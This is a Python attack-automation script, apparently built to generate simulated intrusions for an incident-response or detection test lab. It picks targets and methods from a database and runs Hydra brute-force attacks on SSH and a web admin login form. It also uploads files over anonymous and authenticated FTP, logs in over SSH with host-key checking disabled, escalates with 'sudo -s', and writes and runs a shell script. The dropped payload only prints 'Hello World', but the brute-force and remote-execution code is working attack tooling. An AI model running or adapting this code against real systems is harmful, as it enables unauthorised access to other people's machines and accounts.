import os
import pexpect
import re
import time
from pexpect import pxssh
import logging as log
import inspect
import json
import random
from DataAccess import DataAccess,attacker
import os
import subprocess
from dateutil import parser
import argparse
import shlex

log.basicConfig(filename='attacker.log',level=log.DEBUG)

class attackerClass(object):
	#data=attacker()#instantiate dataAccess class
	"===================================================================INITIALISE========================================================================="
	def __init__(self):
		self.ip = ""
		self.username = ""
		self.password = ""
		self.command = ""
		self.db_array = ""
		self.method = ""
		self.data=attacker()
		#attackerClass.__init__(self)
		#data=attacker()
	def __delete__(self, instance):
		pass

	"===================================================================INITIALISE========================================================================="

	"===================================================================GET ANON AND NORMAL USERES========================================================="
	#Anonymous User Methods
	@staticmethod
	def attack_ftp_user():
		ini = attackerClass()
		user = ini.data.get_ftp_user()
		return user

	@staticmethod
	def attack_ftp_anon_user():
		ini = attackerClass()
		ftp_anon_user = ini.data.get_ftp_anon_user()
		return ftp_anon_user
	"===================================================================GET ANON AND NORMAL USERES========================================================="


	@staticmethod
	def kill_hydra():
		'''
		Method kills hydra service
		'''
		os.system("pkill -f hydra")

	@staticmethod
	def generate_random_request(service_array):
		'''
		Method gets randomly generated data
		Iterates through data
		Compares current value to next value inside the items
		If ip and service and method are the same nothing is executed
		Else call_class_method is executed
		If method is repeating it will only be executed once
		'''

		try:

			for key, val in service_array.items():
				current_ip = val[0].get("IP")
				current_method = val[0].get("Method")
				current_service = val[0].get("Service")
				current_user = val[0].get("User")
				current_pass = val[0].get("Password")

				for nextElement in range(key+1,len(service_array)):
					next_ip = service_array[nextElement][0]["IP"]
					next_method = service_array[nextElement][0]["Method"]
					next_service = service_array[nextElement][0]["Service"]

					if current_ip == next_ip and current_service == next_service and current_method == next_method:
						print("Repeating Method: {} On Server: {} Service: {} \n".format(current_method,current_ip,current_service))

					elif current_ip == next_ip and current_service == next_service and current_method != next_method:
						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
						break

					elif current_ip != next_ip and current_service == next_service and current_method == next_method:
						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
						break

					elif current_ip != next_ip and current_service == next_service and current_method != next_method:
						print("Executing: {} On Server: {}  Service: {} \n".format(current_method,current_ip,current_service))
						attackerClass.call_class_method(current_method,current_ip,current_user,current_pass)
						break
					else:
						print("None")



		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def call_class_method(method,ip,user,password):
		'''
		Method passes arguments to class methods and executes the called method
		'''
		try:
			values = {"IP":ip,"User":user,"Pass":password}
			the_method = getattr(attackerClass,method)(values)
			print()
			print("Method: "+method+" Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)


	@staticmethod
	def hydra_spawn(args):
		'''
		Start Hydra and find username and password for IP address
		If username and password found kill hydra
		Execute collect data method
		'''

		ip = args["IP"]

		try:
			print("Hydra BruteForce Being Executed")
			command = "hydra -L /home/alex/Documents/GitRepo/IR/usernames.txt -P /home/alex/Documents/GitRepo/IR/passwords.txt {} ssh".format(ip)
			child = pexpect.spawn(command)
			time.sleep(30)
			print("BruteForce Successfully Executed")
			child.close()
			attackerClass.kill_hydra()

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF:
			print("BruteForce Executed")
			child.close()
			attackerClass.kill_hydra()

	"===================================================================FTP METHODS========================================================================="

	@staticmethod
	def execute_ftp_login_anon_user(args):
		'''
		FTP directly into the machine using parameters received
		'''
		ip = args["IP"]
		user_data= attackerClass.attack_ftp_anon_user()#attackerClass.attack_ftp_anon_user()
		user = user_data['username']

		try:
			print("Anonymous Login Being Executed")
			line = "ftp -p {}".format(ip)
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("bye")

			print("Anonymous Login Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_put_anon_file(args):
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''

		ip = args["IP"]
		user_data=attackerClass.attack_ftp_anon_user()
		user = user_data['username']

		try:
			print("Anonymous File Creation Being Executed")
			line = "ftp -p {}".format(ip)
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline("put execute.sh")
			child.expect(">")
			child.sendline("bye")

			print("Anonymous File Creation Successfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_get_anon_file(args):
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''

		ip = args["IP"]
		user_data=attackerClass.attack_ftp_anon_user()
		user = user_data['username']

		try:
			print("Anonymous File Download Executed")
			line = "ftp -p {}".format(ip)
			file_command = "get {}".format("myfile.txt")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("Anonymous File Download Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	#Normal User Methods
	@staticmethod
	def execute_ftp_login_normal_user(args):
		'''
		FTP directly into the machine using parameters received
		'''
		ip = args["IP"]
		user_data =attackerClass.attack_ftp_user()
		user = user_data['username']
		password =user_data['password']

		try:
			print("Login Being Executed")
			line = "ftp -p {}".format(ip)
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline("bye")

			print("Login Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_put_user_file(args):
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''

		ip = args["IP"]
		user_data =attackerClass.attack_ftp_user()
		user = user_data['username']
		password =user_data['password']

		try:
			print("File Creation Being Executed")
			line = "ftp -p {}".format(ip)
			file_command = "put {}".format("execute.py")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("File Creation Successfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)
			
	@staticmethod
	def execute_ftp_execute_file(args):
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''

		ip = args["IP"]
		user_data =attackerClass.attack_ftp_user()
		user = user_data['username']
		password =user_data['password']

		try:
			print("File Being Executed")
			line = "ftp -p {}".format(ip)
			file_command = "put {}".format("execute.py")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("File Executed Successfully ")

		except Exception as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ftp_get_user_file(args):
		'''
		FTP directly into the machine using parameters received
		Put a file into the machine
		'''

		ip = args["IP"]
		user_data =attackerClass.attack_ftp_user()
		user = user_data['username']
		password =user_data['password']

		try:
			print("File Download Being Executed")

			line = "ftp -p {}".format(ip)
			file_command = "get {}".format("execute.py")
			child = pexpect.spawn(line)
			child.expect(":")
			child.sendline(user)
			child.expect(":")
			child.sendline(password)
			child.expect(">")
			child.sendline(file_command)
			child.expect(">")
			child.sendline("bye")

			print("File Download Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)
	"===================================================================FTP METHODS========================================================================="

	"===================================================================SSH METHODS========================================================================="
	#Make precautions for new key when prompted so
	@staticmethod
	def execute_ssh_login(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("SSH Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Login Succesful ")

			if index == 1:
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Login Succesful ")

		except Exception as e:
			print (str(e))
			log.exception(e)
			
		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ssh_sudo(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("SSH sudo Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH sudo Login Succesful ")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH sudo Login Succesful ")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))
			log.exception(e)


	@staticmethod
	def execute_ssh_create_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("File Being Created")

			file_command = """echo '#!/bin/bash' >> exe.sh &&  echo 'echo Hello World!' >> exe.sh"""

			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_ssh_execute_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("File Being Executed")
			file_command = "{} {}".format("bash","exe.sh")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print (str(e))
			log.exception(e)
	"===================================================================SSH METHODS========================================================================="
	
	"===================================================================WEB SERVER METHODS========================================================================="
	@staticmethod
	def execute_web_login(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args[0]["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("SSH Web Server Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Web Server Login Succesful ")

			if index == 1:
				ssh_handle.expect("$")
				ssh_handle.sendline("exit")

				print("SSH Web Server Login Succesful ")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_web_sudo_login(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("SSH Web Server sudo Login Being Executed")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH sudo Login Succesful ")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.sendline("logout")

				print("SSH Web Server sudo Login Succesful ")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print("Error")
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_web_create_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("File Being Created")

			file_command = """echo '#!/bin/bash' >> exe.sh &&  echo 'echo Hello World!' >> exe.sh"""

			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Created")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_web_execute_file(args):
		'''
		SSH directly into the machine using parameters received
		'''
		ip = args["IP"]
		user = args["User"]
		password = args["Pass"]

		try:
			print("File Being Executed")
			file_command = "{} {}".format("bash","exe.sh")
			ssh_handle = pxssh.pxssh(options={"StrictHostKeyChecking": "no","UserKnownHostsFile": "/dev/null"})
			ssh_handle.login(ip, user, password)
			index = ssh_handle.expect(['[#\$]','$',pexpect.EOF])

			if index == 0:
				ssh_handle.sendline("yes")
				ssh_handle.sendline(password)
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

			if index == 1:
				ssh_handle.sendline('sudo -s')
				ssh_handle.sendline(password)
				ssh_handle.sendline(file_command)
				ssh_handle.expect("#")
				ssh_handle.sendline("exit")
				ssh_handle.expect("$")
				ssh_handle.logout()

				print("File Succesfully Executed")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pxssh.ExceptionPxssh as e:
			print (str(e))
			log.exception(e)

	@staticmethod
	def execute_web_dowload_files(args):
		'''
		Use wget to download files directly from webserver
		'''
		ip = args["IP"]

		try:
			print("Files Being Downloaded")
			command = "wget -R html,htm,php,asp,jsp,js,py,css -r -A pdf,txt -nd http://{}/index.php/download-menu".format(ip)
			child = pexpect.spawn(command)
			if child.isalive():
				child.expect("$")
				time.sleep(10)			
				print("Files Succesfully Downloaded")
				child.close()


		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF:
			print("Files Succesfully Downloaded")
			child.close()
			
	@staticmethod
	def hydra_web_admin_login(args):
		'''
		Start Hydra and find username and password for IP address
		If username and password found kill hydra
		Execute collect data method
		'''

		ip = args["IP"]

		try:
			print("Hydra BruteForce On Webpage (Admin) Being Executed")
			command = "hydra -l admin -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
			child = pexpect.spawn(command)
			time.sleep(30)
			print("BruteForce Successfully Executed")
			child.close()
			attackerClass.kill_hydra()

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF:
			print("BruteForce On Webpage (Admin) Executed")
			child.close()

	@staticmethod
	def hydra_web_user_login(args):
		'''
		Start Hydra and find username and password for IP address
		If username and password found kill hydra
		Execute collect data method
		'''

		ip = args["IP"]

		try:
			print("Hydra BruteForce On Webpage (User) Being Executed")
			command = "hydra -l user -P /home/alex/Documents/GitRepo/IR/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
			child = pexpect.spawn(command)
			time.sleep(30)
			print("BruteForce Successfully Executed")
			child.close()
			attackerClass.kill_hydra()

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF:
			print("BruteForce On Webpage (User) Executed")
			child.close()
	"===================================================================WEB SERVER METHODS========================================================================="

	"===================================================================DATA ACCSS METHODS========================================================================="


	def get_data(self):
		'''
		Method called from DataAccess.py
		Method collects data from database
		This data is collected randomly
		This Method returns a dictionary
		'''
		try:
			my_dic={}

			count=len(self.data.servers_and_methods)
			service=self.data.service
			servers=self.data.servers_and_methods

			for i in range(0,count):
				items=[{'Service':service['service_name'],'IP':servers[i]['server']['ip_addr'],'User':servers[i]['server']['username'],'Password':servers[i]['server']['password'],'Method':servers[i]['method']['method']}]
				my_dic[i]=items


		except Exception as e:
			print (str(e))
			log.exception(e)

		return my_dic

	def record_transaction(self,test_id):
		self.data.record_transcation(test_id)

		return True

	"===================================================================DATA ACCESS METHODS========================================================================="

	"===================================================================PING SCRIPT========================================================================="
	@staticmethod	
	def execute_ping(args):
		'''
		Start ping script
		'''
		ip = args["IP"]

		try:

			print("Executing PING script")
			subprocess.call(shlex.split('/bin/bash ./machinePing.sh {}'.format(ip)))
			print("Executed PING script Successfully")

		except Exception as e:
			print (str(e))
			log.exception(e)

		except pexpect.EOF as e:
			print (str(e))
			log.exception(e)

	"===================================================================PING SCRIPT========================================================================="

	"===================================================================INITIATE METHOD========================================================================="
	def start_attack(self):
		random_repetition=random.randint(1,5)
		print('Running '+str(random_repetition)+' times')

		#Getting Test ID
		parse = argparse.ArgumentParser()
		parse.add_argument("testID",help="Pass testID to script")
		args = parse.parse_args()

		for i in range(0,random_repetition):
			print('Iteration '+str(i))
			random_time=random.randint(100,300)
			object = attackerClass()
			the_array=object.get_data()
			object.generate_random_request(the_array)
			object.record_transaction(args.testID)
			time.sleep(random_time)
		print('====Execution Complete====')

	"===================================================================INITIATE METHOD========================================================================="


if __name__ == "__main__":
	object = attackerClass()
	object.start_attack()
